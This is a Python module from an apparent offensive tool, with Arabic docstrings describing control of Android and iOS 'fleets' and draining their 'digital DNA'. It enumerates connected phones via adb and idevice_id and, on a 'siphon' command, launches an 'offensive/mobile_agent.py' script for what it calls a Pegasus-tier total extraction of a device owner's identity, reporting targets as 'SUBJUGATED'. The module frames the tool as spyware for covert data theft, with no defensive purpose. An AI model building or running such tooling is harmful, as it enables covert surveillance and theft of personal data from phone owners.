# -*- coding: utf-8 -*-
"""
عقدة الافتراس النقال v90.0 - Mobile Node (The Fleet Commander)
المسؤول عن السيطرة المادية على أساطيل الأندرويد و iOS واستنزاف الـ DNA الرقمي.
"""
from .base_node import BaseNode
import subprocess
import os

class MobileNode(BaseNode):
    def handle_event(self, event):
        etype = event["type"]
        data = event["data"]

        if etype == "list_devices":
            self._probe_mobile_fleet()
        
        elif etype == "siphon_device":
            device_id = data.get("id")
            self._execute_pegasus_siphon(device_id)

    def _probe_mobile_fleet(self):
        """جرد حقيقي للأجهزة المتصلة عبر ADB و idevice"""
        print("📱 [MOBILE] Probing material fleet nodes...")
        try:
            # جرد أندرويد
            adb_out = subprocess.getoutput("adb devices")
            # جرد iOS
            ios_out = subprocess.getoutput("idevice_id -l")
            
            result = {
                "android": adb_out,
                "ios": ios_out,
                "status": "MATERIALIZED"
            }
            self.spine.emit("fleet_status", result, target="Cockpit")
        except Exception as e:
            self.spine.emit("fleet_error", {"error": str(e)}, target="Cockpit")

    def _execute_pegasus_siphon(self, device_id):
        """تنفيذ عملية استنزاف كلي (Pegasus-Tier) للهوية الرقمية"""
        print(f"🧬 [MOBILE] Executing Pegasus Siphon on node: {device_id}")
        # استدعاء أداة الحصاد الخفي المادية
        cmd = f"python3 ai-engine/offensive/mobile_agent.py siphon {device_id}"
        try:
            process = subprocess.Popen(cmd.split(), stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate()
            
            self.spine.emit("siphon_result", {
                "node": device_id,
                "output": stdout or stderr,
                "status": "SUBJUGATED"
            }, target="Cockpit")
        except Exception as e:
            self.spine.emit("siphon_error", {"error": str(e)}, target="Cockpit")

    def can_handle(self, cmd):
        return cmd in ["mobile", "fleet", "siphon"]
